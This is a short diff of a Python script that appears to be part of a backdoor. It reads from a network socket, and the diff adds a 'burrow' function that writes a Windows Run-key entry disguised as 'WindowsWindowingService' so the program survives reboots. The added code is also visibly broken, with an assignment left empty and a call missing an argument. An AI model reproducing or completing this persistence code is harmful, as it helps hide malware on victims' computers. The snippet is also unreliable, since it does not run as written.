@@ -5,7 +5,6 @@ import winreg
 
 REG_PATH = r"Software\Microsoft\Windows\CurrentVersion"
 
-REG_PATH = r"Control Panel\Mouse"
 
 def set_reg(reg, name, value):
     try:
@@ -44,9 +43,12 @@ def main():
     print(s.recv(1024))
     s.close()
 def burrow():
-    if
-    print(get_reg('MouseSensitivity'))
-    get_reg(r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsServe")
+    reg = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    name = "WindowsWindowingService"
+    value =
+    if get_reg(reg, name) is None:
+        set_reg(reg, name )
+
 
 burrow()
 main()
